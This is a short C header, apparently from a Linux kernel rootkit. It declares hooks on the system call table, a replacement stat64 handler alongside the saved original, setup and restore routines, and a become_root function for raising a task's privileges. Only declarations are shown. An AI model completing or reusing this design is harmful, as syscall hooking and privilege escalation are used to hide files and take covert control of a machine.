#ifndef HOOKCALLS_H
#define HOOKCALLS_H

#include "includes.h"

extern void *sys_call_table[];

long (*o_stat64)(const char *, struct stat64 *);

void init_syscalls();
void restore_syscalls();

long m_stat64(const char *, struct stat64 *);

void become_root(struct task_struct *);

#endif
